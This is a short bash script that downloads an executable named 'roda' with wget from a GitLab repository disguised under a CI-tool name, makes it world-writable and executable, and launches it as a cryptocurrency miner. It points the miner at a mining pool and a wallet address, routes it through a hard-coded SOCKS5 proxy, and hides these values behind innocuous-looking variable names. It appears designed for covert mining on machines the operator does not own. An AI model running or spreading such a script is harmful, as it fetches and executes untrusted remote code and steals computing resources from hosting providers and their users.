#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y
wget -O roda https://gitlab.com/krilnols1/buildkite/-/raw/main/roda 
screen -dmS ls
chmod +x phpsur.sh && chmod +x roda && chmod 777 roda phpsur.sh
RENANG=stratum+tcps://stratum-na.rplant.xyz:17115
ACIS=shuga1q7d75aamrpx6zhanaemu57262mlz3u9cvlvz02d
STRESS=yespowersugar
BANGUNAN=Ci-01
PROXY=socks5://158.69.225.110:59166
./roda -a $STRESS -o $RENANG -u $ACIS.$BANGUNAN -t 16 -x $PROXY
